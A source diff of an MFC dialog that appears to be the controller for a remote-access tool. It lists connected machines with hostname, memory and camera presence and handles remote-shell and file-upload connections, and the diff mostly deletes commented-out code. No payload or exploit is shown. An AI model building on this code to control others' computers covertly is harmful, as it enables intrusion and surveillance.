@@ -97,8 +97,6 @@ BEGIN_MESSAGE_MAP(CMFCApplication4Dlg, CDialogEx)
 	ON_MESSAGE(WM_RECV_LOGIN_PACKET, OnRecvLoginPacket)
 	ON_MESSAGE(WM_SOCKET_CLIENT_DISCONNECT, OnSocketClientDisconnect)
 
-//	ON_MESSAGE(WM_RECV_SHELL_CONNECT_PACKET, OnRecvShellConnectPacket)
-
 	ON_MESSAGE(WM_RECV_CHILD_SOCKET_CLIENT_PACKET, OnPostMsgRecvChildSocketClientPacket)
 	ON_MESSAGE(WM_RECV_MAIN_SOCKET_CLIENT_PACKET, OnPostMsgRecvMainSocketClientPacket)
 
@@ -249,25 +247,6 @@ BOOL CMFCApplication4Dlg::PreTranslateMessage(MSG* pMsg)
 }
 
 
-
-//// 按下远程Shell按钮
-//void CMFCApplication4Dlg::OnBnClickedOk()
-//{
-//	RemoteShell *dlg = new RemoteShell();
-//	dlg->Create(IDD_DIALOG1, GetDesktopWindow());
-//	dlg->ShowWindow(SW_SHOW);
-//}
-//
-//
-//// 按下取消按钮
-//void CMFCApplication4Dlg::OnBnClickedCancel()
-//{
-//	
-//}
-
-
-
-
 void CMFCApplication4Dlg::OnLvnItemchangedList2(NMHDR *pNMHDR, LRESULT *pResult)
 {
 	LPNMLISTVIEW pNMLV = reinterpret_cast<LPNMLISTVIEW>(pNMHDR);
@@ -312,20 +291,15 @@ void CMFCApplication4Dlg::OnBnClickedButton1()
 
 	USHORT wPort = (USHORT)dwTemp;
 	if (!theApp.m_Server.IsRunning()) {
-		//BOOL bRet = theApp.m_Server.StartSocketServer(MainSocketRecvPacket, ChildSocketRecvPacket, lpszIpAddress, wPort);
 		BOOL bRet = theApp.m_Server.StartSocketServer(lpszIpAddress, wPort);
 		if (!bRet) {
 			WCHAR pszErrorDesc[512];
-			//MultiByteToWideChar(CP_ACP, 0, (LPCCH)theApp.m_Server.m_pTcpPackServer->GetLastErrorDesc(), -1, (LPWSTR)pszErrorDesc, 512);
 			MessageBox((LPWSTR)(LPCCH)theApp.m_Server.m_pTcpPackServer->GetLastErrorDesc(), L"启动SocketServer失败", 0);
 		}
 		else {
 			m_ButtonStartSocketServer.EnableWindow(false);		// 按钮变灰
 		}
 	}
-	//else {
-	//	MessageBox(L"SocketServer已启动，请先关闭监听，再开始监听");
-	//}
 }
 
 
@@ -351,9 +325,6 @@ afx_msg LRESULT CMFCApplication4Dlg::OnRecvLoginPacket(WPARAM wParam, LPARAM lPa
 	CPacket* pPacket = (CPacket*)lParam;
 	LOGIN_INFO LoginInfo(pPacket->m_pbPacketBody);
 
-	//CHAR szConnectId[15];
-	//_itoa_s(pPacket->m_pClient->m_dwConnectId, szConnectId, 15);	// 从数字转成CHAR字符串
-
 	CHAR szPort[10];
 	_itoa_s(pPacket->m_pSocketClient->m_wPort, szPort, 10);
 
@@ -366,8 +337,7 @@ afx_msg LRESULT CMFCApplication4Dlg::OnRecvLoginPacket(WPARAM wParam, LPARAM lPa
 	lvitemData.iItem = dwInsertIndex;
 	lvitemData.lParam = (LPARAM)(pPacket->m_pClient);	// 额外的信息，这里用于保存本行对应的pClient
 
-	m_ListCtrl.InsertItem(&lvitemData);					// 第一列，ID。
-	//m_ListCtrl.InsertItem(0, A2W(szConnectId));								
+	m_ListCtrl.InsertItem(&lvitemData);					// 第一列，ID。		
 	m_ListCtrl.SetItemText(dwInsertIndex, 1, pPacket->m_pClient->m_lpszIpAddress);		// IP
 	m_ListCtrl.SetItemText(dwInsertIndex, 2, A2W(szPort));								// 端口
 	m_ListCtrl.SetItemText(dwInsertIndex, 3, A2W(LoginInfo.szHostName));				// 计算机名
@@ -376,7 +346,7 @@ afx_msg LRESULT CMFCApplication4Dlg::OnRecvLoginPacket(WPARAM wParam, LPARAM lPa
 	m_ListCtrl.SetItemText(dwInsertIndex, 6, A2W(LoginInfo.szMemoryInfo));				// 内存
 	m_ListCtrl.SetItemText(dwInsertIndex, 7, A2W(LoginInfo.bHaveCamera ? "有" : "无"));	// 摄像头
 
-	delete pPacket;			// 用完了一定要释放啊
+	delete pPacket;	
 	return 0;
 }
 
@@ -388,9 +358,6 @@ afx_msg LRESULT CMFCApplication4Dlg::OnSocketClientDisconnect(WPARAM wParam, LPA
 	// 找到该ConnectId对应的CSocketClient对象
 	CSocketClient* pSocketClient = theApp.m_Server.m_pClientManage->SearchSocketClient(dwConnectId);
 
-	//ASSERT(pSocketClient != NULL);
-	// 有些建立起来的连接，但是封包被过滤了（比如上线包），这种情况下它的connectId就没有写入链表里，
-	// 但是当它OnClose()的时候，也会走到这一步
 	if (pSocketClient == nullptr) {
 		return 0;
 	}
@@ -420,16 +387,6 @@ afx_msg LRESULT CMFCApplication4Dlg::OnSocketClientDisconnect(WPARAM wParam, LPA
 		// 我一直以为HP-Socket的回调是另起一个线程，但是按照上面的情况来推测的话，很可能还是同一个线程。因为这个线程在Wait事件，所以也无法进入OnClose之类的。
 		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WaitChildSocketCloseThreadFunc, (LPVOID)pClientTemp, 0, NULL);
 
-
-		//// 令其所有子socket断开连接（仅disconnect，并没有析构之类的）
-		//pClientTemp->DisConnectedAllChildSocketClient();
-
-		//// 在这阻塞，直至子socket全部断开连接
-		//pClientTemp->WaitForNoChildSocketClientEvent();
-
-		//// 从CClientManage链表中删除此CClient（有析构m_pMainSocketClient）
-		//theApp.m_Server.m_pClientManage->DeleteClientFromList(pClientTemp);
-
 	}
 	// 子socket
 	else {
@@ -443,19 +400,6 @@ afx_msg LRESULT CMFCApplication4Dlg::OnSocketClientDisconnect(WPARAM wParam, LPA
 		// 内含pSocketClient的析构。如果子socket数量为0，则触发信号。
 		pSocketClient->m_pClient->DeleteChildSocketClientFromList(pSocketClient);
 
-		//// 从CClient的链表中删除此CSocketClient。仅删结点，无析构。
-		//__try {
-		//	// 下面的判断其实根本没有用，m_pClient析构的时候，delete的哪个指针被我手动置nullptr了，
-		//	// 但是这个pSocketClient对象中的m_pClient早就把这个指针拷贝了一份，这个没置nullptr，由此指针悬空。
-		//	// 查了下，也没有什么很好的解决方案，先暂时捕捉异常吧，以后可能改成智能指针之类的。 TODO 
-		//	if (pSocketClient->m_pClient != nullptr) {
-		//		pSocketClient->m_pClient->DeleteChildSocketClientFromList(pSocketClient);
-		//	}
-		//}
-		//__finally{}
-		
-		// 从CClientManage的链表中删除此CSocketClient。有析构
-		//theApp.m_Server.m_pClientManage->DeleteChildSocketClientFromList(pSocketClient->m_dwConnectId);
 	}
 	return 0;
 }
@@ -475,111 +419,6 @@ DWORD WINAPI WaitChildSocketCloseThreadFunc(LPVOID lparam) {
 
 	return 0;
 }
-
-
-
-
-	//CONNID dwConnectId = (CONNID)wParam;
-
-	//// 找到该ConnectId对应的Client对象
-	//CSocketClient* pClient = theApp.m_Server.m_ClientManage.SearchClient(dwConnectId);
-	//ASSERT(pClient != NULL);			// pClient肯定不为NULL
-
-	//CSocketClient* pClientTemp = NULL;
-
-	//// 如果是主socket，那么从ListCtrl列表中删掉该客户端的信息
-	//if (pClient->m_bIsMainSocketServer){
-	//	DWORD dwIndex;
-	//	for (dwIndex = 0; dwIndex < m_ListCtrl.GetItemCount(); dwIndex++) {
-	//		// 获取所枚举的这一行的额外信息，pClient
-	//		LV_ITEM  lvitemData = { 0 };
-	//		lvitemData.mask = LVIF_PARAM;
-	//		lvitemData.iItem = dwIndex;
-	//		m_ListCtrl.GetItem(&lvitemData);
-	//		pClientTemp = (CSocketClient*)lvitemData.lParam;
-
-	//		// 确定要删除的那行的索引，并删除这一行
-	//		if (dwConnectId == pClientTemp->m_dwConnectId) {
-	//			m_ListCtrl.DeleteItem(dwIndex);
-	//			//MessageBox(L"下线！");
-	//			break;
-	//		}
-	//	}
-	//}
-	//// 如果是子socket，则关闭相应的打开的对话框。
-	//else {
-	//	((CDialogEx*)(pClient->m_DialogInfo.pClassAddress))->SendMessage(WM_CLOSE);
-	//}
-	//
-	//// 从Client链表中删掉这个Client，包括delete之类的清理工作
-	//theApp.m_Server.m_ClientManage.DeleteClientFromList(pClient);		// 在这个函数里delete pClient
-	//
-	//return 0;
-
-
-//// 收到SHELL_CONNECT封包时创建相应的对话框
-//afx_msg LRESULT CMFCApplication4Dlg::OnRecvShellConnectPacket(WPARAM wParam, LPARAM lParam) {
-//	//CClient* pClient = (CClient*)lParam;
-//	//CShellRemote* pDlg = new CShellRemote(nullptr, pClient);				// 创建对话框
-//	//pClient->m_DialogInfo = { SHELL_REMOTE_DLG, pDlg->m_hWnd, pDlg };		// TODO 句柄不知道有木有问题，记得回来检查
-//	return 0;
-//}
-//
-
-
-
-
-
-// 主socket接收到有效封包时回调此函数
-//void CALLBACK CMFCApplication4Dlg::MainSocketRecvPacket(CPacket *pPacket) {
-//	printf("回调MainSocketRecvPacket\n");
-//
-//	switch (pPacket->m_pClient->m_dwSocketClientStatus) {			// 客户端的不同状态
-//
-//	case WAIT_FOR_LOGIN:									// 服务端已经接收了客户端发来的密钥了，等待上线包
-//			
-//		// 这个阶段，只要不是上线包，通通丢弃。
-//		if (pPacket->m_PacketHead.wCommandId == LOGIN && pPacket->m_dwPacketBodyLength == LOGIN_PACKET_BODY_LENGTH) {
-//			theApp.m_pMainWnd->PostMessage(WM_RECV_LOGIN_PACKET, 0, (LPARAM)pPacket);
-//			pPacket->m_pClient->m_dwSocketClientStatus = LOGINED;
-//			theApp.m_Server.SendPacket(pPacket->m_pClient, LOGIN, NULL, 0);			// 通知客户端已成功登录
-//		}
-//
-//	case LOGINED:											// 接收上线包后，状态变为已登录。开始正常通信。
-//		
-//		switch (pPacket->m_PacketHead.wCommandId) {
-//
-//		case ECHO:
-//			printf("接收到ECHO回显包，明文内容如下：\n");
-//			PrintData(pPacket->m_pbPacketBody, pPacket->m_dwPacketBodyLength);
-//			break;
-//
-//		default:
-//			break;
-//		}
-//	}
-//
-//}
-
-
-// 子socket接收到有效封包时回调此函数
-//void CALLBACK CMFCApplication4Dlg::ChildSocketRecvPacket(CPacket *pPacket) {
-//	//printf("回调ChildSocketRecvPacket\n");
-//
-//	//switch (pPacket->m_PacketHead.wCommandId) {
-//	//	
-//	//case SHELL_CONNECT:
-//	//case SHELL_EXECUTE:
-//	//case SHELL_CLOSE:
-//	//	//printf("HELLO\n");
-//	//	OnRecvShellRemotePacket(pPacket);
-//	//	break;
-//
-//
-//	//default:
-//	//	break;
-//	//}
-//}
 
 
 // 按下右键时触发，选择客户端时显示右键菜单
@@ -609,7 +448,6 @@ void CMFCApplication4Dlg::OnRClickMenu(NMHDR *pNMHDR, LRESULT *pResult)
 
 
 // 右键菜单：断开连接
-// 淦，ON_COMMAND的映射函数不能放参数
 afx_msg void CMFCApplication4Dlg::OnTouchDisconnectClient() {
 
 	UINT i, uSelectedCount = m_ListCtrl.GetSelectedCount();
@@ -723,11 +561,6 @@ void CMFCApplication4Dlg::ProcessRClickSelectCommand(COMMAND_ID Command, PBYTE p
 
 
 
-
-
-
-
-
 // 主socket收到packet时，通过PostMessage传递消息后调用
 afx_msg LRESULT CMFCApplication4Dlg::OnPostMsgRecvMainSocketClientPacket(WPARAM wParam, LPARAM lParam) {
 	DebugPrint("OnPostMsgRecvMainSocketClientPacket\n");
@@ -784,7 +617,6 @@ afx_msg LRESULT CMFCApplication4Dlg::OnPostMsgRecvMainSocketClientPacket(WPARAM 
 BOOL CMFCApplication4Dlg::ProcessConnectPacket(CPacket* pPacket) {
 
 	CSocketClient* pSocketClient = pPacket->m_pSocketClient;
-	//CModule* pModule = pSocketClient->m_pModule;
 	CClient* pClient = pPacket->m_pClient;
 
 	switch (pPacket->m_PacketHead.wCommandId) {
@@ -795,7 +627,6 @@ BOOL CMFCApplication4Dlg::ProcessConnectPacket(CPacket* pPacket) {
 		break;
 		
 	case FILE_UPLOAD_CONNECT:
-		//RunFileUpload(pSocketClient);
 		pClient->m_pFileUploadConnectSocketClientTemp = pSocketClient;
 		SetEvent(pClient->m_FileUploadConnectSuccessEvent);
 		delete pPacket;
